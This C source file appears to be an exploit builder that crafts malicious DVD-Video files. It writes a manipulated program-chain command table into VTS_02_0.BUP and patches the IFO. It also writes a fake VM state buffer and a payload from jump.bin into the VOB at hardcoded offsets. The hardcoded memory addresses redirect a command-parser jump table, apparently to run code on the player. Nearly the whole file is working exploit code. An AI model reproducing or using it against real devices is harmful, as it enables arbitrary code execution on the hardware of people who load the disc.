#include "pgc.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MIN(x, y) ((x) > (y) ? (y) : (x))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
    pgc_t *pgc = (pgc_t *)calloc(1, sizeof(pgc_t));
    uint8_t *pgc_buf = NULL;
    uint32_t pgc_buf_len = 0;

    if (!pgc) {
        return -1;
    }
    
    if (!out_path) {
        free(pgc);
        return -1;
    }
 
    for (int i = 0; i < 16; ++i) {
        pgc->pgc_gi.pgc_sp_plt[i] = 0x108080;
    }

    pgc->pgc_gi.set_pgc_cnt_cn(1);
    pgc->pgc_gi.set_pgc_cnt_pn(1);
    pgc->pgc_gi.set_pgc_pb_tm_hours(0);
    pgc->pgc_gi.set_pgc_pb_tm_minutes(0);
    pgc->pgc_gi.set_pgc_pb_tm_seconds(1);
    pgc->pgc_gi.set_pgc_pb_tm_frames(5);
    pgc->pgc_gi.set_pgc_pb_tm_frame_rate(PGC_TM_FR_25);
    pgc->pgc_gi.pgc_ast_ctlt[0].stream_num_pf = 1 << 7;
    pgc->pgc_gi.pgc_pgmap_sa = 0xec;
    pgc->pgc_gi.c_pbit_sa = 0xee;
    pgc->pgc_gi.c_posit_sa = 0x106;
    pgc->pgc_gi.pgc_cmdt_sa = 0x11e + off;

    pgc->pgc_pgmap.en_cn[0] = 1;

    pgc->c_pbit.pbi[0].set_c_cat_sys_tm_clk_discontinuity_flag(1);
    pgc->c_pbit.pbi[0].set_c_pbtm_hours(0);
    pgc->c_pbit.pbi[0].set_c_pbtm_minutes(0);
    pgc->c_pbit.pbi[0].set_c_pbtm_seconds(1);
    pgc->c_pbit.pbi[0].set_c_pbtm_frames(5);
    pgc->c_pbit.pbi[0].set_c_pbtm_frame_rate(PGC_TM_FR_25);
    pgc->c_pbit.pbi[0].c_lvobu_sa = 23;
    pgc->c_pbit.pbi[0].c_lvobu_ea = 39;

    pgc->c_posit.c_posi[0].c_vob_idn = 1;
    pgc->c_posit.c_posi[0].c_idn = 1;

    pgc->pgc_cmdt.cmds[1] = 0x30;
    pgc->pgc_cmdt.pgc_cmdti.pre_cmd_n = MAX(1, ((len >> 3) + 1) & 0xffff);
    pgc->pgc_cmdt.pgc_cmdti.pgc_cmdt_ea = 15;
    pgc_build(pgc, &pgc_buf, &pgc_buf_len);
    if (!pgc_buf) {
        free(pgc);
        return -1;
    }
    uint8_t vts_pgci[16] = {
        0, 1, 0, 0,
        0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff,
        0, 0, 0, 16
    };

    uint32_t end_addr = 16 + (pgc_buf_len - 1);

    if (*((uint16_t *)"\x00\x01") == 1) {
        memcpy(vts_pgci+4, &end_addr, 4);
        memcpy(vts_pgci+8, &eaddr, 4);
    } else {
        vts_pgci[4] = ((uint8_t *)&end_addr)[3];
        vts_pgci[5] = ((uint8_t *)&end_addr)[2];
        vts_pgci[6] = ((uint8_t *)&end_addr)[1];
        vts_pgci[7] = ((uint8_t *)&end_addr)[0];

        vts_pgci[8] = ((uint8_t *)&eaddr)[3];
        vts_pgci[9] = ((uint8_t *)&eaddr)[2];
        vts_pgci[10] = ((uint8_t *)&eaddr)[1];
        vts_pgci[11] = ((uint8_t *)&eaddr)[0];
    }

    FILE *fp = fopen(out_path, "rb+");
    if (!fp) {
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    if (fwrite(vts_pgci, 1, 16, fp) != 16) {
        fclose(fp);
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    fseek(fp, 16, SEEK_SET);
    if (fwrite(pgc_buf, 1, pgc_buf_len, fp) != pgc_buf_len) {
        fclose(fp);
        free(pgc);
        free(pgc_buf);
        return -1;
    }
    fclose(fp);
    free(pgc_buf);
    free(pgc);
    return 0;
}

#define VOB_PATCH_LOC 0x629
#define IFO_PGC_PATCH_LOC 0xcc
#define IFO_CODE_PATCH_LOC 0x25c

#define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
#define VM_ADDR 0x01558e40
#define CTRL_DATA_ADDR (0x155cec0 + 0x0c + 0x629)
#define JUMP_POINTER 0x0090ec20
#define VM_CMD_PARSER_SWITCH_INDEX_VAL ((JUMP_POINTER - VM_CMD_PARSER_SWITCH_ADDR) >> 2)
#define CMD_DATA_ADDR 0x01551da8
#define NEEDED_LEN ((VM_ADDR - CMD_DATA_ADDR) + 24)
#define INITIAL_COPY_BUF (0x1555608 + 0x10)
#define INITIAL_COPY_BUF_TARGET (INITIAL_COPY_BUF + (NEEDED_LEN - 24))
#define CMDT_SA (CTRL_DATA_ADDR - INITIAL_COPY_BUF_TARGET)
#define EXEC_ADDR (CTRL_DATA_ADDR + 27)
#define NEW_PGC_SECT "\x00\x00\x00\x2e"

int main() {
    printf("CMDT_SA: %x\n", CMDT_SA);
    printf("NEEDED_LEN: %x\n", NEEDED_LEN);

    if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
        fprintf(stderr, "Error: Failed to generate exploit PGC\n");
        return -1;
    }

    uint8_t buf[24] = {
        0x00, // VM_current_cmd_type_index
        0x00, // VM_current_cmd_index
        0x00, 0x00, // padding
        0xa8, 0x1d, 0x55, 0x01, // VM_current_cmd_data
        0x01, // DAT_01558e48
        0x00, // padding
        VM_CMD_PARSER_SWITCH_INDEX_VAL & 0xff, // FP_INDEX_lo
        (VM_CMD_PARSER_SWITCH_INDEX_VAL >> 8) & 0xff, // FP_INDEX_lo_hi
        0x00, 0x00, // VM_current_opcode_type
        0x00, // VM_current_opcode_direct
        0x00, // padding
        0x00, 0x00, // VM_current_opcode_set
        0x00, 0x00, // VM_current_opcode_dir_cmp
        0x03, 0x00, // VM_current_opcode_cmp
        0x00, 0x00 // VM_current_opcode_cmd
    };

    FILE *fp = fopen("./build/jump.bin", "rb");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open jump.bin\n");
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "Error: Failed to get file size\n");
        fclose(fp);
        return -1;
    }
    uint32_t payload_len = (uint32_t)file_size;
    if (payload_len > 444) {
        printf("Warning: payload truncated from %u to 444 bytes!\n", payload_len);
        payload_len = 444;
    }
    fseek(fp, 0, SEEK_SET);
    uint8_t *payload = malloc(payload_len);
    if (!payload) {
        fprintf(stderr, "Error: Failed to allocate memory for payload\n");
        fclose(fp);
        return -1;
    }
    if (fread(payload, 1, payload_len, fp) != payload_len) {
        fprintf(stderr, "Error: Failed to read payload\n");
        free(payload);
        fclose(fp);
        return -1;
    }
    fclose(fp);

    fp = fopen("./build/fs/VIDEO_TS/VTS_01_1.VOB", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_01_1.VOB\n");
        free(payload);
        return -1;
    }

    fseek(fp, VOB_PATCH_LOC, SEEK_SET);
    if (fwrite(buf, 1, 24, fp) != 24) {
        fprintf(stderr, "Error: Failed to write buffer to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }
    fseek(fp, VOB_PATCH_LOC + 27, SEEK_SET);
    if (fwrite(payload, 1, payload_len, fp) != payload_len) {
        fprintf(stderr, "Error: Failed to write payload to VOB\n");
        free(payload);
        fclose(fp);
        return -1;
    }
    free(payload);
    fclose(fp);

    fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
    if (!fp) {
        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
        return -1;
    }
    fseek(fp, IFO_PGC_PATCH_LOC, SEEK_SET);
    if (fwrite(NEW_PGC_SECT, 1, 4, fp) != 4) {
        fprintf(stderr, "Error: Failed to write to IFO\n");
        fclose(fp);
        return -1;
    }
    fclose(fp);

    puts("OK");
    return 0;
}